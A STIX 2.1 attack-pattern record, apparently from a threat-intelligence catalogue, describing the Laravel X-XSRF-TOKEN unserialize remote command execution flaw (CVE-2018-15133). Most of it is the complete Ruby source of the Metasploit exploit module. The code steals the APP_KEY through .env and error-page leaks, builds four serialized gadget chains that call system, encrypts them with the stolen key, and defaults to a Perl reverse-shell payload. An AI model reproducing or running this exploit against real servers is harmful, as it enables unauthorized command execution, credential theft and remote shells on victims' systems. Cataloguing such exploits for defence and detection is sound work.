{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e284dbd2-8d58-4cce-8ef4-fc836c5312c1",
    "created": "2024-08-14T17:14:33.549839Z",
    "modified": "2024-08-14T17:14:33.549843Z",
    "name": "PHP Laravel Framework token Unserialize Remote Command Execution",
    "description": " This module exploits a vulnerability in the PHP Laravel Framework for versions 5.5.40, 5.6.x <= 5.6.29. Remote Command Execution is possible via a correctly formatted HTTP X-XSRF-TOKEN header, due to an insecure unserialize call of the decrypt method in Illuminate/Encryption/Encrypter.php. Authentication is not required, however exploitation requires knowledge of the Laravel APP_KEY. Similar vulnerabilities appear to exist within Laravel cookie tokens based on the code fix. In some cases the APP_KEY is leaked which allows for discovery and exploitation.  'DisclosureDate' => '2018-08-07'",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/http/laravel_token_unserialize_exec.rb",
            "external_id": "laravel_token_unserialize_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2018-15133"
        },
        {
            "source_name": "CVE",
            "external_id": "2017-16894"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/kozmic/laravel-poc-CVE-2018-15133"
        },
        {
            "source_name": "reference",
            "url": "https://laravel.com/docs/5.6/upgrade#upgrade-5.6.30"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/laravel/framework/pull/25121/commits/d84cf988ed5d4661a4bf1fdcb08f5073835083a0"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name' => 'PHP Laravel Framework token Unserialize Remote Command Execution',\n      'Description' => %q{\n        This module exploits a vulnerability in the PHP Laravel Framework for versions 5.5.40, 5.6.x <= 5.6.29.\n        Remote Command Execution is possible via a correctly formatted HTTP X-XSRF-TOKEN header, due to\n        an insecure unserialize call of the decrypt method in Illuminate/Encryption/Encrypter.php.\n        Authentication is not required, however exploitation requires knowledge of the Laravel APP_KEY.\n        Similar vulnerabilities appear to exist within Laravel cookie tokens based on the code fix.\n        In some cases the APP_KEY is leaked which allows for discovery and exploitation.\n      },\n      'DisclosureDate' => '2018-08-07',\n      'Author' =>\n        [\n          'St\u00e5le Pettersen',  # Discovery\n          'aushack',          # msf exploit + other leak\n        ],\n      'References' =>\n        [\n          ['CVE', '2018-15133'],\n          ['CVE', '2017-16894'],\n          ['URL', 'https://github.com/kozmic/laravel-poc-CVE-2018-15133'],\n          ['URL', 'https://laravel.com/docs/5.6/upgrade#upgrade-5.6.30'],\n          ['URL', 'https://github.com/laravel/framework/pull/25121/commits/d84cf988ed5d4661a4bf1fdcb08f5073835083a0']\n        ],\n      'License' => MSF_LICENSE,\n      'Platform' => 'unix',\n      'Arch' => ARCH_CMD,\n      'DefaultTarget' => 0,\n      'Stance' => Msf::Exploit::Stance::Aggressive,\n      'DefaultOptions' => { 'PAYLOAD' => 'cmd/unix/reverse_perl' },\n      'Payload' => { 'DisableNops' => true },\n      'Targets' => [[ 'Automatic', {} ]],\n    ))\n\n    register_options([\n      OptString.new('TARGETURI', [ true, 'Path to target webapp', '/']),\n      OptString.new('APP_KEY', [ false, 'The base64 encoded APP_KEY string from the .env file', ''])\n    ])\n  end\n\n  def check\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, 'index.php'),\n      'method' => 'GET'\n    })\n\n    # Can be 'XSRF-TOKEN', 'X-XSRF-TOKEN', 'laravel_session', or $appname_session... and maybe more?\n    unless res && res.headers && res.headers.to_s =~ /XSRF-TOKEN|laravel_session/i\n      return CheckCode::Unknown\n    end\n\n    auth_token = check_appkey\n    if auth_token.blank? || test_appkey(auth_token) == false\n      vprint_error 'Unable to continue: the set datastore APP_KEY value or information leak is invalid.'\n      return CheckCode::Detected\n    end\n\n    random_string = Rex::Text.rand_text_alphanumeric(12)\n\n    1.upto(4) do |method|\n      vuln = generate_token(\"echo #{random_string}\", auth_token, method)\n\n      res = send_request_cgi({\n        'uri' => normalize_uri(target_uri.path, 'index.php'),\n        'method' => 'POST',\n        'headers' => {\n          'X-XSRF-TOKEN' => \"#{vuln}\",\n        }\n      })\n\n      if res.body.include?(random_string)\n        return CheckCode::Vulnerable\n      # Not conclusive but witnessed in the wild\n      elsif res.body.include?('Method Not Allowed')\n        return CheckCode::Safe\n      end\n    end\n    CheckCode::Detected\n  rescue Rex::ConnectionError\n    CheckCode::Unknown\n  end\n\n  def env_leak\n    key = ''\n    vprint_status 'Checking for CVE-2017-16894 .env information leak'\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, '.env'),\n      'method' => 'GET'\n    })\n\n    # Good but may be other software. Can also check for 'APP_NAME=Laravel' etc\n    return key unless res && res.body.include?('APP_KEY') && res.body =~ /APP_KEY\\=base64:(.*)/\n    key = $1\n\n    if key\n      vprint_good \"APP_KEY Found via CVE-2017-16894 .env information leak: #{key}\"\n      return key\n    end\n\n    vprint_status 'Website .env file exists but didn\\'t find a suitable APP_KEY'\n    key\n  end\n\n  def framework_leak(decrypt_ex = true)\n    key = ''\n    if decrypt_ex\n      # Possible config error / 0day found by aushack during pentest\n      # Seen in the wild with recent releases\n      res = send_request_cgi({\n        'uri' => normalize_uri(target_uri.path, 'index.php'),\n        'method' => 'POST',\n        'headers' => {\n          'X-XSRF-TOKEN' => Rex::Text.rand_text_alpha(1) # May trigger\n        }\n      })\n\n      return key unless res && res.body.include?('DecryptException') && res.body.include?('APP_KEY')\n    else\n      res = send_request_cgi({\n        'uri' => normalize_uri(target_uri.path, 'index.php'),\n        'method' => 'POST'\n      })\n\n      return key unless res && res.body.include?('MethodNotAllowedHttpException') && res.body.include?('APP_KEY')\n    end\n    # Good sign but might be more universal with e.g. 'vendor/laravel/framework' ?\n\n    # Leaks all environment config including passwords for databases, AWS, REDIS, SMTP etc... but only the APP_KEY appears to use base64\n    if res.body =~ /\\>base64:(.*)\\<\\/span\\>/\n      key = $1\n      vprint_good \"APP_KEY Found via Laravel Framework error information leak: #{key}\"\n    end\n\n    key\n  end\n\n  def check_appkey\n    key = datastore['APP_KEY'].present? ? datastore['APP_KEY'] : ''\n    return key unless key.empty?\n\n    vprint_status 'APP_KEY not set. Will try to find it...'\n    key = env_leak\n    key = framework_leak if key.empty?\n    key = framework_leak(false) if key.empty?\n    key.empty? ? false : key\n  end\n\n  def test_appkey(value)\n    value = Rex::Text.decode_base64(value)\n    return true if value && value.length.to_i == 32\n\n    false\n  end\n\n  def generate_token(cmd, key, method)\n    # Ported phpggc Laravel RCE php objects :)\n    case method\n      when 1\n      payload_decoded = 'O:40:\"Illuminate\\Broadcasting\\PendingBroadcast\":2:{s:9:\"' + \"\\x00\" + '*' + \"\\x00\" + 'events\";O:15:\"Faker\\Generator\":1:{s:13:\"' + \"\\x00\" + '*' + \"\\x00\" + 'formatters\";a:1:{s:8:\"dispatch\";s:6:\"system\";}}s:8:\"' + \"\\x00\" + '*' + \"\\x00\" + 'event\";s:' + cmd.length.to_s + ':\"' + cmd + '\";}'\n      when 2\n      payload_decoded = 'O:40:\"Illuminate\\Broadcasting\\PendingBroadcast\":2:{s:9:\"' + \"\\x00\" + '*' + \"\\x00\" + 'events\";O:28:\"Illuminate\\Events\\Dispatcher\":1:{s:12:\"' + \"\\x00\" + '*' + \"\\x00\" + 'listeners\";a:1:{s:' + cmd.length.to_s + ':\"' + cmd + '\";a:1:{i:0;s:6:\"system\";}}}s:8:\"' + \"\\x00\" + '*' + \"\\x00\" + 'event\";s:' + cmd.length.to_s + ':\"' + cmd + '\";}'\n      when 3\n      payload_decoded = 'O:40:\"Illuminate\\Broadcasting\\PendingBroadcast\":1:{s:9:\"' + \"\\x00\" + '*' + \"\\x00\" + 'events\";O:39:\"Illuminate\\Notifications\\ChannelManager\":3:{s:6:\"' + \"\\x00\" + '*' + \"\\x00\" + 'app\";s:' + cmd.length.to_s + ':\"' + cmd + '\";s:17:\"' + \"\\x00\" + '*' + \"\\x00\" + 'defaultChannel\";s:1:\"x\";s:17:\"' + \"\\x00\" + '*' + \"\\x00\" + 'customCreators\";a:1:{s:1:\"x\";s:6:\"system\";}}}'\n      when 4\n      payload_decoded = 'O:40:\"Illuminate\\Broadcasting\\PendingBroadcast\":2:{s:9:\"' + \"\\x00\" + '*' + \"\\x00\" + 'events\";O:31:\"Illuminate\\Validation\\Validator\":1:{s:10:\"extensions\";a:1:{s:0:\"\";s:6:\"system\";}}s:8:\"' + \"\\x00\" + '*' + \"\\x00\" + 'event\";s:' + cmd.length.to_s + ':\"' + cmd + '\";}'\n    end\n\n    cipher = OpenSSL::Cipher.new('AES-256-CBC') # Or AES-128-CBC - untested\n    cipher.encrypt\n    cipher.key = Rex::Text.decode_base64(key)\n    iv = cipher.random_iv\n\n    value = cipher.update(payload_decoded) + cipher.final\n    pload = Rex::Text.encode_base64(value)\n    iv = Rex::Text.encode_base64(iv)\n    mac = OpenSSL::HMAC.hexdigest('SHA256', Rex::Text.decode_base64(key), iv+pload)\n    iv = iv.gsub('/', '\\\\/') # Escape slash\n    pload = pload.gsub('/', '\\\\/') # Escape slash\n    json_value = %Q({\"iv\":\"#{iv}\",\"value\":\"#{pload}\",\"mac\":\"#{mac}\"})\n    json_out = Rex::Text.encode_base64(json_value)\n\n    json_out\n  end\n\n  def exploit\n    auth_token = check_appkey\n    if auth_token.blank? || test_appkey(auth_token) == false\n      vprint_error 'Unable to continue: the set datastore APP_KEY value or information leak is invalid.'\n      return\n    end\n\n    1.upto(4) do |method|\n      sploit = generate_token(payload.encoded, auth_token, method)\n\n      res = send_request_cgi({\n        'uri' => normalize_uri(target_uri.path, 'index.php'),\n        'method' => 'POST',\n        'headers' => {\n        'X-XSRF-TOKEN' => sploit,\n        }\n      }, 5)\n\n      # Stop when one of the deserialization attacks works\n      break if session_created?\n\n      if res && res.body.include?('The MAC is invalid|Method Not Allowed') # Not conclusive\n        print_status 'Target appears to be patched or otherwise immune'\n      end\n    end\n  end\nend\n",
    "x_mitre_platforms": [
        "unix'"
    ]
}